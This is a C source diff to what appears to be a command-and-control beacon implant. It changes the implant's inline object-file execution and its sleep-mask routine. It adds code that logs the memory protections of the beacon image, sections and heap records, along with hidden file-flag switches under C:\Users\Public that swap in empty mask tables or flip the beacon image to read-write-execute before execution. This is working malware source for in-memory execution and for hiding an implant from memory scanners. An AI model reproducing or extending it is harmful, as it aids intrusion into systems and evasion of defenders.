@@ -259,9 +259,39 @@ void setup_functions(BOFF_FUNCTIONS * f) {
 }
 
 #if defined(_M_X64)
-static void sm_dump_gparms(GARGLEP * gp, char * bof, SIZE_T blen, DWORD t) {
+static void sm_dump_prots(char * buf, int * np, void * p, char * tag) {
+	MEMORY_BASIC_INFORMATION m;
+	if (p == NULL || VirtualQuery(p, &m, sizeof(m)) == 0) {
+		*np += wsprintfA(buf + *np, "%s=?\r\n", tag);
+		return;
+	}
+	*np += wsprintfA(buf + *np, "%s alloc=%08X prot=%08X state=%08X type=%08X\r\n",
+		tag, m.AllocationProtect, m.Protect, m.State, m.Type);
+}
+
+/* last byte offset covered by the (real) sections table, for RWX flips */
+static DWORD sm_max_end(GARGLEP * gp) {
+	DWORD maxe = 0;
+	int i;
+	if (gp == NULL || gp->sections == NULL)
+		return 0;
+	for (i = 0; i < 64; i++) {
+		DWORD a = gp->sections[i * 2];
+		DWORD b = gp->sections[i * 2 + 1];
+		if (a == 0 && b == 0)
+			break;
+		if (a == 0xFFFFFFFFUL || b == 0xFFFFFFFFUL)
+			continue;
+		if (b > maxe)
+			maxe = b;
+	}
+	return maxe;
+}
+
+static void sm_dump_gparms(GARGLEP * gp, char * bof, SIZE_T blen, DWORD t,
+	DWORD sm_mode, DWORD sm_span, void * entryp) {
 	HANDLE h;
-	char buf[3584];
+	char buf[4096];
 	int n = 0;
 	int i;
 	DWORD wr;
@@ -277,10 +307,25 @@ static void sm_dump_gparms(GARGLEP * gp, char * bof, SIZE_T blen, DWORD t) {
 	}
 	n += wsprintfA(buf + n, "beacon_ptr=%p sections=%p heap=%p\r\n",
 		gp->beacon_ptr, gp->sections, gp->heap_records);
+	n += wsprintfA(buf + n, "sm_mode=%u span=%X procinj I=%04X F=%04X\r\n",
+		sm_mode, sm_span,
+		(unsigned short)setting_short(SETTING_PROCINJ_PERMS_I),
+		(unsigned short)setting_short(SETTING_PROCINJ_PERMS));
+	sm_dump_prots(buf, &n, gp->beacon_ptr, "q_beacon:");
+	if (sm_span != 0)
+		sm_dump_prots(buf, &n, (char *)gp->beacon_ptr + sm_span - 1, "q_beacon_end:");
+	sm_dump_prots(buf, &n, gp->sections, "q_sect:");
+	sm_dump_prots(buf, &n, gp->heap_records, "q_heap:");
+	sm_dump_prots(buf, &n, bof, "q_bof:");
+	if (entryp != NULL) {
+		unsigned __int64 v = *(unsigned __int64 *)entryp;
+		n += wsprintfA(buf + n, "entry=%p bytes=%08X%08X\r\n",
+			entryp, (unsigned)(v >> 32), (unsigned)v);
+	}
 	if (gp->sections == NULL)
 		n += wsprintfA(buf + n, "sections=NULL\r\n");
 	else {
-		for (i = 0; i < 24 && n < 3000; i++) {
+		for (i = 0; i < 24 && n < 3200; i++) {
 			DWORD a = gp->sections[i * 2];
 			DWORD b = gp->sections[i * 2 + 1];
 			n += wsprintfA(buf + n, "sec[%d] %08X %08X", i, a, b);
@@ -298,7 +343,7 @@ static void sm_dump_gparms(GARGLEP * gp, char * bof, SIZE_T blen, DWORD t) {
 	if (gp->heap_records == NULL)
 		n += wsprintfA(buf + n, "heap=NULL FAULT_[rcx+10]\r\n");
 	else {
-		for (i = 0; i < 24 && n < 3400; i++) {
+		for (i = 0; i < 24 && n < 3800; i++) {
 			char * p = gp->heap_records[i].ptr;
 			unsigned z = (unsigned)gp->heap_records[i].size;
 			n += wsprintfA(buf + n, "heap[%d] ptr=%p size=%u", i, p, z);
@@ -652,7 +697,34 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 					memcpy(gparms->mask, info.mask, MASK_SIZE);
 				}
 #if defined(_M_X64)
-				sm_dump_gparms(gparms, code_dst, total, t);
+				/* Diagnostic switches, re-checked on every sleep:
+				   C:\Users\Public\sm_empty -> invoke with an empty sections table
+				   and a terminator-only heap table (isolates XOR content from
+				   prologue / call rbp / return path).
+				   C:\Users\Public\sm_wrwx  -> VirtualProtect the beacon image to
+				   RWX before invoke (left RWX; tests the RX-write hypothesis). */
+				{
+					static HEAP_RECORD sm_empty_heap[1] = { { NULL, 0 } };
+					DWORD sm_mode = 0;
+					DWORD sm_span;
+					if (GetFileAttributesA("C:\\Users\\Public\\sm_empty") != INVALID_FILE_ATTRIBUTES)
+						sm_mode |= 1;
+					if (GetFileAttributesA("C:\\Users\\Public\\sm_wrwx") != INVALID_FILE_ATTRIBUTES)
+						sm_mode |= 2;
+					sm_span = sm_max_end(gparms);
+					sm_dump_gparms(gparms, code_dst, total, t, sm_mode, sm_span,
+						(void *)inlinefunc);
+					if ((sm_mode & 1) != 0 && gparms != NULL) {
+						gparms->sections = empty_sections;
+						gparms->heap_records = sm_empty_heap;
+					}
+					if ((sm_mode & 2) != 0 && gparms != NULL && sm_span != 0) {
+						DWORD sm_old;
+						if (VirtualProtect(gparms->beacon_ptr, sm_span,
+								PAGE_EXECUTE_READWRITE, &sm_old))
+							sm_mode |= 4;
+					}
+				}
 #endif
 				if (gparms == NULL)
 					Sleep(t);
